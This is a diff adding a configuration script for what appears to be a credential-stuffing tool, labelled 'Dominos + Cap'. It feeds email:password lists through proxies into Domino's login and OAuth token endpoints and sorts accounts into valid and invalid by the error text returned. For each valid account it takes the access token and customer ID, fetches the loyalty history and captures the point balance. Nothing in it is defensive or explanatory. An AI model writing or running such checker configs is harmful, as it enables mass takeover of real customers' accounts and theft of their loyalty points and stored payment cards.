@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "Dominos + Cap",
+  "SuggestedBots": 10,
+  "LastModified": "2018-05-28T21:58:55.7708225+00:00",
+  "AdditionalInfo": "",
+  "Author": "Train",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://api.dominos.com/conversation-service/authorize?client_id=alexa&response_type=token&state=A2SAAEAELbwZQU_1CqaK3EFifwBY1IB0GiQwMZG3lH-g9iAxCdl2F9xt_sFMKPkNSWysPrfh0NfL55W4tbSuEvNNEs4ROWyccOj4xVt7h1CUM77nZPpWQO7gQLO8ftsGv0iL-Wg6ZlTLbs3RzUkBQ8C7P4OD5PLEgeGnsTUNWz2Fr9ebJz7QL8ZRNU8YBvP_X7ANXgOHqrkJ5nF97WTRnPPl3unfIfEqd60P9RoyB8KnqoS5wybbRRr8-9WwEgPHGwiA-TNKXGzozYk7MPskUdebhScRK7g6edqSAYoAsPIPdzuDtSO1zHmx495TyjF8WPx202KGehskSZRMM0j8uFXRTe0gSUxYQqsXKIfupY0PZFmJn2jXnHvvkEP1cCfSKWwZm3-9LkqbkEthS48k2PETpWYbFGen-E2CDZeAuD8nW7GlVfW0C8eBv1GA8U97risoVH-YIJZ5urQYfJoPRQpPNSnSHnkryfBB84dCSDtitfLNBKQIzx_p8hBT7G2mk1MgG65PgLmUbRu_N4n6t1_sMuZDz2TZEGdbYhIlOPNVK-WRTZ1FBiJeLxNT6VZbn3TjJB8SVmz21w-BsMiDDNmjnx-c9Ceaz_7EEAnTHNAQhaHuiRp1bJgWSBFXk-B2EMhYCnjBX--&scope=customer%3Aprofile%3Aread%3Abasic+customer%3Aprofile%3Aread%3Aextended+customer%3Acard%3Aread+customer%3AorderHistory%3Aread+customer%3Aloyalty%3Aread+order%3Aplace%3AcardOnFile&redirect_uri=https%3A%2F%2Fpitangui.amazon.com%2Fspa%2Fskill%2Faccount-linking-status.html%3FvendorId%3DM16I8H3S3T55KO" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+REQUEST POST "https://api.dominos.com/conversation-service/authorize" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&clientId=alexa" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY ">We could not locate a Pizza Profile with that e-mail and password combination. Please make sure you are using the e-mail address associated with your Domino" 
+    KEY "error" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain ">We could not locate a Pizza Profile with that e-mail and password combination. Please make sure you are using the e-mail address associated with your Domino" 
+REQUEST POST "https://api.dominos.com/as/token.oauth2" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate&client_id=Android&validator_id=VoldemortCredValidatorCustID&grant_type=password" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#backup_keys KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username & password combination" 
+PARSE "<SOURCE>" JSON "access_token" Recursive=FALSE -> VAR "token" "" "" 
+#broken REQUEST POST "https://order.dominos.com/power/login?rememberMe=false" AutoRedirect=TRUE 
+  CONTENT " " 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <token>" 
+PARSE "<SOURCE>" JSON "CustomerID" Recursive=FALSE -> VAR "id" "" "" 
+REQUEST GET "https://order.dominos.com/power/customer/<id>/loyalty/history" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <token>" 
+PARSE "<SOURCE>" JSON "VestedPointBalance" Recursive=FALSE -> CAP "Points" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "VestedPointBalance\":0" 
